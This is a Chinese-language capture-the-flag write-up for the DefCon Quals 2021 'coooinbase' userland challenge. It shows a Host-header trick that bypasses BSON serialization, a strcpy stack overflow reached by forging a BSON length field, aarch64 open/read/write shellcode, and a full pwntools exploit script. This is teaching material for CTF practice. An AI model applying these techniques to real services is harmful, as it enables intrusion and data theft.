> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/242112)

> 题目来源于 DefCon Quals 2021 的 coooinbase 二连 pwn，第一部分是用户空间利用，第二部分是内核利用。本篇文章是 coooinbase 用户态 pwn 的解题思路。

[![](https://p3.ssl.qhimg.com/t01f4ae3bee0d8aeb12.png)](https://p3.ssl.qhimg.com/t01f4ae3bee0d8aeb12.png)

题目来源于 DefCon Quals 2021 的 coooinbase 二连 pwn，第一部分是用户空间利用，第二部分是内核利用。本篇文章是 coooinbase 用户态 pwn 的解题思路。

在 Github 上找到对应源码

[![](https://p3.ssl.qhimg.com/t0102572e830778d3e4.png)](https://p3.ssl.qhimg.com/t0102572e830778d3e4.png)

这是一款极其精简的的 OS，没有 shell，甚至只实现了有限的几个系统调用，包括 open、read、write 等。在`coooinbase.bin`这个内核基础上，再跑着一个用户态进程`run`，以下是关于`run`这个用户态进程的 pwn

[![](https://p4.ssl.qhimg.com/t0130bf0f7c51288e2f.png)](https://p4.ssl.qhimg.com/t0130bf0f7c51288e2f.png)

Ruby 源码审计
---------

给了以下几个文件，执行`ruby x.rb`启动题目环境

[![](https://p0.ssl.qhimg.com/t01a410babd066a4c10.png)](https://p0.ssl.qhimg.com/t01a410babd066a4c10.png)

解压文件系统

```
mkdir /tmp/dos
sudo mount -o loop ./rootfs.img /tmp/dos
file /tmp/dos/bin
/tmp/dos/bin: PDP-11 kernel overlay
cat /tmp/dos/flg
OOO{this_is_from_userland}
```

x.rb，会对输入的`credit_card`进行校验，看下是否 valid，可用`4485-7873-4804-0088`通过检查

[![](https://p3.ssl.qhimg.com/t01413c7494d16c1053.png)](https://p3.ssl.qhimg.com/t01413c7494d16c1053.png)

通过 POST 方法`/gen-bson`获取`cvv`、`expmonth`、`expyear`、`cardnumber`参数，序列化成 bson 数据，最后转成 base64。但是，bson 只能接受`0x0~0x7f`的 utf-8 数据，超出这个范围的 byte 数据会导致没法通过 x.rb 的 check，这为后续构造 rop 带来困难。

[![](https://p5.ssl.qhimg.com/t01e1672a9536253179.png)](https://p5.ssl.qhimg.com/t01e1672a9536253179.png)

将 bson 数据传给`/buy`这个 POST 方法，注意到`http://#{env['HTTP_HOST']}/gen-bson`的访问是通过`HTTP_HOST`参数，也就是能通过 http header 的`Host`参数去设置 URI.parse 的链接

[![](https://p4.ssl.qhimg.com/t01f49e8f370142c374.png)](https://p4.ssl.qhimg.com/t01f49e8f370142c374.png)

现在转而向我们搭建的 http server 去获取`gen-bson`这个文件或者接口，这样便能绕过 bson 序列化，直接将任意 byte 的 base64 数据喂给`x.sh`

```
curl -X POST -d "cvc=123" http://localhost:4567/buy -H "Host: localhost:8080"
```

[![](https://p2.ssl.qhimg.com/t01a9099c141d0ca076.png)](https://p2.ssl.qhimg.com/t01a9099c141d0ca076.png)

静态分析
----

导入 Ghidra，Language 选择 aarch64 小端

[![](https://p2.ssl.qhimg.com/t010dbbf77ea37cb51c.png)](https://p2.ssl.qhimg.com/t010dbbf77ea37cb51c.png)

读取喂入的 base64 数据，最多读 512 bytes，然后 base64 decode

[![](https://p5.ssl.qhimg.com/t018a7bdccdf3e5b60f.png)](https://p5.ssl.qhimg.com/t018a7bdccdf3e5b60f.png)

获取 base64 decode 后的 bson 数据，将 bson 数据复制到`payload_start`，分别获取 bson 的`CVC`、`MON`、`YR`、`CC`键值，其中`CC`是 str 类型，其余为 num 类型，最后输出`CC`的 str 内容

[![](https://p3.ssl.qhimg.com/t019a88fb6737cd5e9a.png)](https://p3.ssl.qhimg.com/t019a88fb6737cd5e9a.png)

`process_cc`里有一处`strcpy`栈溢出，直接将`CC`字符串拷贝到栈上。由于栈空间是根据`CC`字符串串长度来动态扩展，下面需要分析 bson 数据结构。

[![](https://p1.ssl.qhimg.com/t014866dde29b99cb30.png)](https://p1.ssl.qhimg.com/t014866dde29b99cb30.png)

BSON 数据结构
---------

接下来分析一下 bson 数据结构，通过以下脚本生成 bson 序列化数据

```
import bson

obj = {
    'CVC': 1111,
    'MON': 11,
    'CC': "AAAAAAAAAAAAAAAAAAAAAA",
    'YR': 1111
}

bs = bson.dumps(obj)
print(hexdump(bs))
```

bson 数据有几个重要结构：  
1. 开始的 4 个 byte，表示整个 bson 数据的总长度；  
2.`\x10`、`\x02`表示这个 key 对应存放的是 num、str 类型的数据；  
3.key 和 value 之间用`\x00`分隔；  
4.str 类型的数据，有一个额外 4 个 byte 的数值指示 value 的长度。

[![](https://p1.ssl.qhimg.com/t01d08bf05774703645.png)](https://p1.ssl.qhimg.com/t01d08bf05774703645.png)

现在便可构造 bson 数据结构，bson 结构最后有个`\x00`，需要先去掉。然后拼接上`CC`结构，`CC`长度为`字符串长度+1`，最后 1 byte 为`\x00`。另外，bson 结构结束符为`\x00`，需要在最后补上。注意，`CVC`是信用卡的后三码，这里指定为三位数字。

```
obj = {
    'CVC': 111,
    'MON': 11,
    'YR': 2021
}
bs = bson.dumps(obj)

bs = bs[:-1]
bs += b'\x02'
bs += b'CC'
bs += b'\x00'
bs += p32(0x17)
bs += b'C'*22 + b'\x00'
bs += b'\x00'

#print(hexdump(bs))
print(b64e(bs)+' ')
```

Debug
-----

编辑`x.sh`，增加`-s -S`参数，开启调试接口并在内核启动时挂起

```
qemu-system-aarch64 -s -S -machine virt -cpu cortex-a57 -smp 1 -m 64M -nographic -serial mon:stdio -monitor none -kernel coooinbase.bin -drive if=pflash,format=raw,file=rootfs.img,unit=1,readonly
```

现将`AAAAA...`串的 base64 存到 payload 文件，执行`./x.sh < payload`喂入数据

[![](https://p5.ssl.qhimg.com/t014bfa1bf36ab00857.png)](https://p5.ssl.qhimg.com/t014bfa1bf36ab00857.png)

userland 程序装载地址为`0x0`

[![](https://p4.ssl.qhimg.com/t01c2a6c5eb3f20eb05.png)](https://p4.ssl.qhimg.com/t01c2a6c5eb3f20eb05.png)

喂入构造好的 bson base64 数据`python solve.py | x.sh`，断在 strcpy 处。现在程序将`AAAAAAA...`串拷贝到 process_cc 栈上

[![](https://p2.ssl.qhimg.com/t012dfa1c0a6923ce6a.png)](https://p2.ssl.qhimg.com/t012dfa1c0a6923ce6a.png)

但此处的栈会根据 bson `CC`结构里的 4 个 byte 长度去动态扩展栈空间，因而没法溢出到返回地址`0xf958`。但我们可以通过修改这 4 个 byte 长度结构去绕过，给出一个较小的长度与一个较长的字符串，便能覆盖`process_cc`的返回地址

[![](https://p1.ssl.qhimg.com/t010c29c5e256e4b2f0.png)](https://p1.ssl.qhimg.com/t010c29c5e256e4b2f0.png)

返回地址已被覆盖为`AAAAAAAA`

[![](https://p3.ssl.qhimg.com/t0150203d2d97c7d2a7.png)](https://p3.ssl.qhimg.com/t0150203d2d97c7d2a7.png)

成功劫持了 PC

[![](https://p3.ssl.qhimg.com/t010f680334608f0c66.png)](https://p3.ssl.qhimg.com/t010f680334608f0c66.png)

Hijack to ORW
-------------

由于 OS 内核并没有 PIE、NX、Canary 等保护，可以跳回栈上执行 shellcode。同时，OS 并未实现`execve`等 pop shell 系统调用，只能通过 orw 读 flag。

```
shellcode = '''ldr x0,=0x676c662f // /flg
mov x1, 0x0        // open mode
stp x0, x1, [sp]
mov x0, sp
mov x5, 0x340      // SYS_open
blr  x5

mov x1, 0xf940     // buf
mov x2, 0x36       // size
mov x5, 0x34c      // SYS_read
blr  x5

mov x0, 0xf940     // buf
mov x5, 0x310      // SYS_write
blr  x5'''
```

`strcpy`对`\x00`截断，需要找另外一处存放有 shellcode 的内存空间

[![](https://p1.ssl.qhimg.com/t016095f2003873d6a7.png)](https://p1.ssl.qhimg.com/t016095f2003873d6a7.png)

注意到 main 方法中的 base64_decode 会将 decode 后的 bson 数据存放到一个栈地址上，返回到此处就行

[![](https://p0.ssl.qhimg.com/t0159bd52a9854707bc.png)](https://p0.ssl.qhimg.com/t0159bd52a9854707bc.png)

shellcode 布置在`0xfc46`

[![](https://p4.ssl.qhimg.com/t010a390d3408010395.png)](https://p4.ssl.qhimg.com/t010a390d3408010395.png)

将`process_cc`返回地址覆盖为`0xfc46`

[![](https://p1.ssl.qhimg.com/t01c71bafbd2fd0e3ee.png)](https://p1.ssl.qhimg.com/t01c71bafbd2fd0e3ee.png)

get flag~

[![](https://p4.ssl.qhimg.com/t01e0ae40140e432f49.png)](https://p4.ssl.qhimg.com/t01e0ae40140e432f49.png)

Script
------

完整 EXP

```
from pwn import *
import bson

context.arch = 'aarch64'

obj = {
    'CVC': 111,
    'MON': 11,
    'YR': 2021
}
bs = bson.dumps(obj)

bs = bs[:-1]
bs += b'\x02'
bs += b'CC'
bs += b'\x00'
bs += p32(0x10)
bs += b'A'*(0x18)
bs += p64(0xfc46)#ret addr

shellcode = '''ldr x0,=0x676c662f // /flg
mov x1, 0x0        // open mode
stp x0, x1, [sp]
mov x0, sp
mov x5, 0x340      // SYS_open
blr  x5

mov x1, 0xf940     // buf
mov x2, 0x36       // size
mov x5, 0x34c      // SYS_read
blr  x5

mov x0, 0xf940     // buf
mov x5, 0x310      // SYS_write
blr  x5'''

payload = asm(shellcode)
bs += payload + b'\x00'
bs += b'\x00'

#print(hexdump(bs))
print(b64e(bs)+' ')
```